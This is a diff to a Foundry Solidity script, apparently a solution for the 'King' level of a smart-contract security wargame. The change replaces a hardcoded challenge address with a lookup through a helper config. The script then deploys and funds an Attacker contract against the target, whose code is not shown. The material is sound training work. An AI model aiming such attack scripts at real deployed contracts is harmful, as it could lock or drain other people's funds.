@@ -3,6 +3,7 @@
 pragma solidity ^0.8.19;
 
 import { Script, console } from "forge-std/Script.sol";
+import { HelperConfig } from "./HelperConfig.s.sol";
 import { King } from "../src/09_King.sol";
 
 contract Attacker {
@@ -25,11 +26,14 @@ contract Attacker {
 
 contract KingAttacker is Script {
 
-  address payable challengeInstanceAddress = payable(0x913bE527a67E3a0945ec13A7c00f3480C48965d2);
-  King challenge = King(challengeInstanceAddress);
   uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
 
   function run() external {
+
+    HelperConfig helperConfig = new HelperConfig();
+    address payable challengeInstanceAddress = payable(helperConfig.instances("King"));
+    King challenge = King(challengeInstanceAddress);    
+
     vm.startBroadcast(deployerPrivateKey);
     Attacker attacker = new Attacker(challengeInstanceAddress);
     attacker.fundContract{value: 1}();
